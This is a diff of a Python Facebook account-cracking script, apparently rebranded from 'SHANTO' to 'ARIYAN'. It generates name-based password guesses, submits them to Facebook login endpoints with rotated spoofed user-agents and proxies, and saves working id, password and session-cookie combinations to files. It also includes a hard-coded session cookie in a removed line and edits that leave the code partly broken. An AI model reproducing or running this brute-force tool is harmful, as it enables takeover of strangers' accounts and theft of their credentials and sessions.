@@ -89,6 +89,14 @@ def cek_apk(session,coki):
        
 #------------------[ USER-AGENT ]-------------------#
 ua =  '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/AIRTEL;FBMF/INFINIX MOBILE LIMITED;FBBD/INFINIX;FBPN/com.facebook.katana;FBDV/INFINIX X676C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
+ua = ["Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Xiaomi MI 4(MI 4W) Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.6.3.0 (Baidu; P1 4.4.4)",]
+ua = ["Mozilla/5.0 (Linux; U; Android 13; en-gb; Xiaomi 13 Ultra Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.37.1-gn",]
+ua = ["Mozilla/5.0 (Linux; U; Android 13; fr-fr; TECNO CK6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/13.6",]
+ua = ["Mozilla/5.0 (Linux; U; Android 13; es-es; Redmi Pad Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",]
+ua = ["Mozilla/5.0 (Linux; Android 12; Armor X10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
+ua = ["Mozilla/5.0 (Linux; Android 12; 2209116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.65821",]
+ua = ["Mozilla/5.0 (Linux; Android 13; TECNO CK9n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/361.0.0.12.5;]",]
+
 ugen2=[]
 ugen=[]
 ugen=[]
@@ -164,21 +172,6 @@ f = 'developer'
 
 
 #------------[ WARNA-COLOR ]--------------#
-
-
-
-ugen = ["Mozilla/5.0 (Linux; U; Android 4.4.4; zh-cn; Xiaomi MI 4(MI 4W) Build/KTU84P) AppleWebKit/534.24 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.24 T5/2.0 baidubrowser/5.6.3.0 (Baidu; P1 4.4.4)",]
-ugen2 = ["Mozilla/5.0 (Linux; U; Android 13; en-gb; Xiaomi 13 Ultra Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.37.1-gn",]
-ugen3 = ["Mozilla/5.0 (Linux; U; Android 13; fr-fr; TECNO CK6 Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36 PHX/13.6",]
-ugen4 = ["Mozilla/5.0 (Linux; U; Android 13; es-es; Redmi Pad Build/TP1A.220624.014) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.25.2.2-gn",]
-ugen5 = ["Mozilla/5.0 (Linux; Android 12; Armor X10 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36",]
-ugen6 = ["Mozilla/5.0 (Linux; Android 12; 2209116AG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 Mobile Safari/537.36 OPR/68.3.3557.65821",]
-ugen7 = ["Mozilla/5.0 (Linux; Android 13; TECNO CK9n Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/361.0.0.12.5;]",]
-
-
-
-
-
 RED = '\x1b[38;5;208m'
 WHITE = '\033[1;92m'
 GREEN = '\033[\033[1;92m' 
@@ -399,9 +392,9 @@ def passwrd():
 					pwv.append(frs+'firstlast')
 					pwv.append(frs+'first@@')
 					pwv.append(frs+'last123')
-					pwv.append(frs+'11')
-					pwv.append(frs+'1111')
-					pwv.append(frs+'1122')
+					pwv.append(frs+'khan123')
+					pwv.append(frs+'i love you')
+					pwv.append(frs+'first last')
 					pwv.append(frs+'firstslast')
 					pwv.append(frs+'first123')
 			else:
@@ -439,7 +432,7 @@ def passwrd():
 def crack(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
-	sys.stdout.write(f"\r{bo} [SHANTO] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
+	sys.stdout.write(f"\r{bo} [ARIYAN] {h}[{k}{loop}/{len(id)}{h}] {h}[OK] {h}[{ok}] {h}[{''.format(loop/float(len(id)))}] ")
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -456,7 +449,7 @@ def crack(idf,pwv):
 			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
 			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r\x1b[1;91m [\033[1;91mSHANTO-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;91m [\033[1;91mARIYAN-CP\033[1;91m] \033[1;91m '+idf+ ' | '+pw+'')
 				#open('/sdcard/'+ALAMIN-file clone,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -467,10 +460,10 @@ def crack(idf,pwv):
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				#print('\x1b[1;91m \x1b[1;92m═━═━═━═━═━━═━═━═\033[1;92m Ｃ\033[1;93mＹ\033[1;94mＢ\033[1;95mＥ\033[1;96mＲ\033[1;95m－\033[1;94m５\033[1;96m０\033[1;92m5\x1b[1;92m ═━═━═━═━═━━═━═━═\x1b[1;91m  ')
 				#print ()
-				print(f'\r\x1b[1;92m [\033[1;92mSHANTO-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
+				print(f'\r\x1b[1;92m [\033[1;92mARIYAN-OK\033[1;92m] \033[1;92m '+idf+ ' | '+pw+'')
 				#print('\r\x1b[1;96m [\033[1;93mCOOKIES\033[1;96m]\033[1;91m= \033[1;97m '+kuki+'')
 				cek_apk(session,coki)
-				open('/sdcard/SHANTO-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
+				open('/sdcard/ARIYAN-FILE-CLONE-OK','a').write(idf+'|'+pw+'|'+kuki+'\n')
 				akun.append(idf+'|'+pw)
 				break
 				
@@ -569,16 +562,15 @@ def rcerek(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
+        	header_freefb = {"authority": 'mbasic.facebook.com',
             'method': 'GET',
             'scheme': 'https', 
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-BD,en;q=0.9,bn-BD;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
+            'accept-language': 'en-US,en;q=0.9',
             'cache-control': 'max-age=0',
-            # 'cookie': 'datr=fBUAZGGo-zMzoZjvnOPMeaNz; sb=fBUAZGpDUevpF5cTHSS8f8v7; zsh=ASQEMcVxs1Zu4umLrmv5bi5cdHTvtE6cX5t1nR70Zx6TTzg42yQdiyV5yQaeiFC-Yc9w5_n2IyawhKuazcDFoQ-I4ME-3rqn62nPOIm211zbCUljOP-p6BME9mqEd0JnSW0DsyQTS2O-MyMpMrD6oKDgKf6B-eOe85tMxbq_i30PVJOcwti4BNGvn0Hj2DoycBje20B0gy6Q6Ctbki4vogOKtmkDnBGoru_-LKLx9kF-STlYrv2Oo-IHKgnIaGJXOOixrXv0icu-Y1e-XogPkMzzdy1n6_I6_qA2jxZhiMwT2hCZG4FBFjAJZ_AmSTjgy47Vy0Lks2E9bV8-; m_pixel_ratio=2; wd=360x806; fr=0bqgIuM91Owb0Yk1O..BkABV8.W2.AAA.0.0.BkAf8X.AWWVwHU9NPA',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="111", "Opera";v="96"',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="96"',
             'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform': '"macOS"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
@@ -591,11 +583,11 @@ def rcerek(uid,pwx,tl):
         	    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
         	    cid = coki[151:166]
         	    print ('')
-        	    print('\033[1;92m[\033[1;92mSHANTO-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
+        	    print('\033[1;92m[\033[1;92mARIYAN-XD\033[1;92m] \033[1;92m'+uid+' | '+ps+ '\033[1;91m = \033[1;96m '+tahunng(cid))
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
                ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
         	    cek_apk(session,coki)
-        	    open('/sdcard/SHANTO-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/ARIYAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
         	elif 'checkpoint' in log_cookies:
@@ -604,14 +596,14 @@ def rcerek(uid,pwx,tl):
         	   # print('\033[1;96m[ALAMIN.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
               #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                 #cek_apk(session,coki)
-        	    open('/sdcard/SHANTO-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
+        	    open('/sdcard/ARIYAN-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
         	    cps.append(uid)
         	    break          
         	else:
         	    continue
         loop+=1
         #sys.stdout.write('\r%s[𝙲𝚛𝚎𝚊𝚔𝚒𝚗𝚐]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
-        sys.stdout.write('\r%s[SHANTO-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[ARIYAN-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
 	
     except:
@@ -665,7 +657,7 @@ def alamin(uid,pwv,tl):
         	    print ('\033[1;93m [\033[1;96mCookie \033[1;93m]\033[1;91m = \033[1;92m '+coki+'')
                ###### print ('\033[1;36m[‎ 🎉 ]\033[1;91m = \033[1;34m'+pro+'  \033[0;32m')
         	    cek_apk(session,coki)
-        	    open('/sdcard/SHANTO-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
+        	    open('/sdcard/ARIYAN-RANDOM.OK.txt', 'a').write( uid+' | '+ps+'\n')
         	    oks.append(uid)
         	    break 
             elif 'checkpoint' in log_cookies:
@@ -674,20 +666,20 @@ def alamin(uid,pwv,tl):
         	   # print('\033[1;96m[ALAMIN.CP]\033[1;93m[😪]\033[1;96m'+cid+' | '+ps+'\033[1;94m.= '+tahunng(cid))
               #  print ('\033[1;32m[‎🥂🍻🍾🍷]\033[1;91m = \033[1;34m'+coki+'  \033[0;32m')
                 #cek_apk(session,coki)
-        	    open('/sdcard/SHANTO-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
+        	    open('/sdcard/ARIYAN-RANDOM-CP.txt', 'a').write( cid+' | '+ps+' \n')
         	    cps.append(uid)
         	    break          
             else:
         	    continue
         loop+=1
         #sys.stdout.write('\r%s[𝙲𝚛𝚎𝚊𝚔𝚒𝚗𝚐]%s/%s][OK-%s]\033[1;92m[CP-%s]\r'%(bi,loop,tl,len(oks),len(cps))),
-        sys.stdout.write('\r%s[SHANTO-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r%s[ARIYAN-XD]\033[1;32m-%s/%s][OK-%s]\033[1;92m[CP-%s] \r'%(bi,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
 
 def mex():
-    imt = '=SHANTO=XD='
+    imt = '=ARIYAN=XD='
     os.system('clear')
     banner()   
     try:
